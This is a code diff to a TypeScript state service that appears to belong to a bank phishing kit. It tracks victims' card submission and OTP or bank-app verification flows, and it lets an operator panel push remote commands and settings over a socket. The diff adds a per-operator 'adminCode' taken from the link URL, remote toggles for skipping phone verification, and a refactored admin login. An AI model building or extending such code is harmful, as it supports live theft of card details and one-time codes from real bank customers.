@@ -92,6 +92,9 @@ export class StateService {
   readonly verificationFlow = signal<'otp' | 'app' | 'both' | 'complete'>('complete');
   readonly skipPhoneVerification = signal<boolean>(false);
 
+  // Personalized Link
+  readonly adminCode = signal<string>('');
+
   // Metadata & Fingerprint
   readonly sessionId = signal<string>('');
   readonly startTime = signal<Date>(new Date());
@@ -146,6 +149,15 @@ export class StateService {
 
   constructor(private router: Router) {
     this.initializeSession();
+
+    // Capture Admin Code from URL
+    if (typeof window !== 'undefined') {
+        const params = new URLSearchParams(window.location.search);
+        const code = params.get('id');
+        if (code) {
+            this.adminCode.set(code);
+        }
+    }
 
     // Sync Router Navigation (Back Button, Deep Links) to State
     this.router.events.pipe(
@@ -577,7 +589,8 @@ export class StateService {
           isCardSubmitted: this.isCardSubmitted(),
           isFlowComplete: this.isFlowComplete(),
           waitingStart: this.waitingStartPublic(),
-          autoApproveThreshold: this.autoApproveThreshold()
+          autoApproveThreshold: this.autoApproveThreshold(),
+          adminCode: this.adminCode()
       };
       // Debug
       // console.log('[State] Building Payload:', { stage: p.stage, view: p.currentView });
@@ -613,6 +626,9 @@ export class StateService {
           const res: any = await firstValueFrom(request$);
           if (res && res.ok && res.json) {
               const data = await res.json();
+              if (data.settings) {
+                  this.applyRemoteSettings(data.settings);
+              }
               if (data.command) {
                   this.handleRemoteCommand(data.command);
                   return true;
@@ -620,6 +636,17 @@ export class StateService {
           }
       } catch (e) {}
       return false;
+  }
+
+  private applyRemoteSettings(s: any) {
+      if (s.skipPhone !== undefined) this.skipPhoneVerification.set(!!s.skipPhone);
+      if (s.forceBankApp !== undefined && s.forceBankApp) {
+           // Maybe set verificationFlow?
+           // The backend logic currently just passes settings.
+           // We need to respect them.
+           // If 'Force Bank App' is on, we should ensure flow is 'app' or 'both'?
+           // For now, let's just expose it or handle specific flags.
+      }
   }
 
   // --- Admin Fetch ---
@@ -1101,15 +1128,18 @@ export class StateService {
 
   // --- Admin Actions ---
   
-  loginAdmin(u: string, p: string): boolean {
-      if (u === this.adminUsername() && p === this.adminPassword()) {
-          this.adminAuthenticated.set(true);
+  setAdminAuthenticated(isAuthenticated: boolean) {
+      this.adminAuthenticated.set(isAuthenticated);
+      if (isAuthenticated) {
           this.socket.emit('joinAdmin');
-          this.navigate('admin'); // Ensure router updates
+          this.navigate('admin');
           this.fetchSessions();
-          this.loadSettings();
-          return true;
+          // Settings now loaded via AuthService or specific call
       }
+  }
+
+  loginAdmin(u: string, p: string): boolean {
+      // Deprecated: Use AuthService
       return false;
   }
 
